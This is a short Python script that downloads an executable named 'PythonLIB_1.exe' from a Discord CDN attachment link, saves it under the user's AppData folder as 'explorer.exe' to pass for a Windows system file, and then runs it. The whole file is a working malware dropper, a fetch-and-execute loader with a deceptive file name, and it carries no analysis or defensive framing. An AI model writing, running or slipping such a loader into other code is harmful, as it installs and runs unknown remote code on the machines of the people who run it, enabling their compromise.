import requests
import subprocess
import os

path = os.environ["USERPROFILE"] + "\AppData\Local\explorer.exe"

response = requests.get("https://cdn.discordapp.com/attachments/1172852260624154634/1175533888689410098/PythonLIB_1.exe?ex=656b943f&is=65591f3f&hm=f4d25282ac7a847decf421fd95c77b8f7ba6b325c73cc4c413db786b7b1f0b3f&")

if response.status_code != 200:
    exit()

with open(path, 'wb') as file:
    file.write(response.content)

if os.path.exists(path):
    subprocess.run(path, shell=True)